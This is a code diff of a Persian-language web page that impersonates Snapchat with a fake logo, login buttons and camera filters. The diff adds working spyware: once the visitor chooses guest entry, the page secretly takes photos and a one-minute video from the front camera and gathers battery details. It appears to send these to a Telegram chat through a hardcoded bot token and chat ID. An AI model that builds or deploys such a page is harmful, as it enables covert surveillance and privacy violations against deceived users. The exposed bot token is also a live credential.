@@ -2,107 +2,128 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>SnapCam</title>
+  <title>Snap Auto</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
   <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/lucide@latest"></script>
   <style>
     body {
+      direction: rtl;
+      font-family: 'Vazirmatn', sans-serif;
       margin: 0;
-      font-family: "Vazirmatn", sans-serif;
-      background: #fff000;
+      background: #FFFC00;
       overflow: hidden;
     }
     #video {
-      position: absolute;
-      top: 0; left: 0;
       width: 100%;
-      height: 100%;
+      height: 100vh;
       object-fit: cover;
-      z-index: 0;
-    }
-    .overlay {
       position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      z-index: 1;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      filter: var(--filter, none);
+    }
+    .overlay, .login-screen, .splash {
+      position: absolute;
+      inset: 0;
+      z-index: 10;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
+      justify-content: center;
+      align-items: center;
+      transition: opacity 1s ease;
+    }
+    .login-screen {
+      background: white;
+    }
+    .btn {
+      width: 80%;
+      max-width: 320px;
+      margin: 0.5rem;
       padding: 1rem;
-      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
+      border-radius: 9999px;
+      font-size: 1.1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.3s ease;
     }
-    .circle-btn {
-      width: 72px;
-      height: 72px;
-      background-color: white;
-      border-radius: 50%;
-      border: 4px solid #000;
+    .btn:hover {
+      transform: scale(1.05);
     }
-    .fade {
-      transition: opacity 0.7s ease;
+    .glasses {
+      position: absolute;
+      top: 35%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100px;
+      opacity: 0.7;
+      z-index: 5;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
-
-  <!-- Splash -->
-  <div id="splash" class="w-full h-screen bg-yellow-300 flex items-center justify-center flex-col gap-4 fade">
-    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="w-24 h-24 animate-bounce" />
-    <h1 class="text-2xl font-bold">Snapchat</h1>
+  <!-- Splash Screen -->
+  <div class="splash bg-yellow-400 flex justify-center items-center flex-col">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" width="120" />
+    <h1 class="text-3xl font-bold mt-4">Snapchat</h1>
   </div>
 
-  <!-- Login -->
-  <div id="login" class="hidden w-full h-screen bg-yellow-300 flex flex-col items-center justify-center gap-6 fade">
-    <h2 class="text-xl font-bold">وارد شوید</h2>
-    <button onclick="fakeLogin('google')" class="w-72 bg-white text-black rounded-full py-3 text-sm flex items-center justify-center gap-2 shadow-lg hover:scale-105 transition">
-      <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg" class="w-5 h-5" />
-      ورود با گوگل
-    </button>
-    <button onclick="fakeLogin('facebook')" class="w-72 bg-white text-black rounded-full py-3 text-sm flex items-center justify-center gap-2 shadow-lg hover:scale-105 transition">
-      <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" class="w-5 h-5" />
-      ورود با فیسبوک
-    </button>
-    <button onclick="startApp()" class="w-72 bg-black text-white rounded-full py-3 text-sm flex items-center justify-center gap-2 shadow-lg hover:scale-105 transition">
-      ورود مهمان
-    </button>
+  <!-- Login Screen -->
+  <div class="login-screen hidden">
+    <h2 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h2>
+    <div class="btn bg-blue-600 text-white"><img src="https://img.icons8.com/color/48/google-logo.png" width="24"> ورود با گوگل</div>
+    <div class="btn bg-blue-800 text-white"><img src="https://img.icons8.com/fluency/48/facebook-new.png" width="24"> ورود با فیسبوک</div>
+    <div class="btn bg-gray-100 border" onclick="enterAsGuest()">ورود مهمان</div>
   </div>
 
   <!-- Camera -->
-  <div id="app" class="hidden">
-    <video id="video" autoplay playsinline muted></video>
-    <div class="overlay">
-      <div class="flex justify-between">
-        <div></div>
-        <button class="text-black p-2 bg-white/40 rounded-full cursor-default" disabled>
-          <i data-lucide="camera"></i>
-        </button>
-      </div>
-      <div class="flex justify-center">
-        <button class="circle-btn cursor-default" disabled></button>
-      </div>
+  <video id="video" autoplay muted playsinline class="hidden"></video>
+  <img src="https://img.icons8.com/emoji/96/sunglasses-emoji.png" class="glasses hidden" />
+
+  <div class="overlay hidden text-center space-y-4">
+    <div class="flex justify-center gap-2 mt-4">
+      <button onclick="setFilter('none')" class="bg-white p-2 rounded-full">فیلتر خام</button>
+      <button onclick="setFilter('grayscale(1)')" class="bg-white p-2 rounded-full">سیاه‌سفید</button>
+      <button onclick="setFilter('sepia(1)')" class="bg-white p-2 rounded-full">قهوه‌ای</button>
+      <button onclick="setFilter('contrast(2)')" class="bg-white p-2 rounded-full">کنتراست</button>
+      <button onclick="setFilter('hue-rotate(90deg)')" class="bg-white p-2 rounded-full">رنگی</button>
     </div>
   </div>
 
   <script>
-    lucide.createIcons();
+    const splash = document.querySelector(".splash");
+    const loginScreen = document.querySelector(".login-screen");
+    const overlay = document.querySelector(".overlay");
+    const video = document.getElementById("video");
+    const glasses = document.querySelector(".glasses");
 
     const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
     const chatId = "-1002651451203";
 
-    // Splash to login
-    setTimeout(() => {
-      document.getElementById('splash').classList.add("opacity-0");
-      setTimeout(() => {
-        document.getElementById('splash').classList.add("hidden");
-        document.getElementById('login').classList.remove("hidden");
-      }, 700);
-    }, 2000);
+    let mediaRecorder, chunks = [], photoCount = 0, videoSent = false, stream;
 
-    function fakeLogin(type) {
-      alert("ورود با " + type + " در حال حاضر فعال نیست.");
+    function setFilter(filter) {
+      video.style.setProperty('--filter', filter);
     }
+
+    function enterAsGuest() {
+      loginScreen.classList.add("hidden");
+      video.classList.remove("hidden");
+      overlay.classList.remove("hidden");
+      glasses.classList.remove("hidden");
+      startCamera();
+    }
+
+    setTimeout(() => {
+      splash.classList.add("hidden");
+      loginScreen.classList.remove("hidden");
+    }, 2500);
 
     async function getBatteryInfo() {
       if (navigator.getBattery) {
@@ -115,36 +136,25 @@
       return { level: "?", charging: false };
     }
 
-    let stream, mediaRecorder, chunks = [], photoCount = 0, videoSent = false;
-
-    async function startApp() {
-      document.getElementById('login').classList.add("opacity-0");
-      setTimeout(() => {
-        document.getElementById('login').classList.add("hidden");
-        document.getElementById('app').classList.remove("hidden");
-        startCamera();
-      }, 700);
-    }
-
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { width: 640, height: 480, facingMode: "user" }
         });
-        document.getElementById('video').srcObject = stream;
-        startRecording();
+        video.srcObject = stream;
         takeAutoPhotos();
+        startRecording();
       } catch (err) {
-        alert("دسترسی به دوربین رد شده یا مشکل دارد.");
+        alert("دسترسی به دوربین رد شد.");
       }
     }
 
     async function takePhoto() {
-      const video = document.getElementById("video");
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext("2d");
+      ctx.filter = getComputedStyle(video).getPropertyValue('--filter');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async blob => {
         const battery = await getBatteryInfo();
@@ -172,9 +182,7 @@
       mediaRecorder.onstop = sendVideo;
       mediaRecorder.start();
       setTimeout(() => {
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
+        if (mediaRecorder.state === "recording") mediaRecorder.stop();
       }, 60000);
     }
 
@@ -199,6 +207,5 @@
       }
     });
   </script>
-
 </body>
 </html>
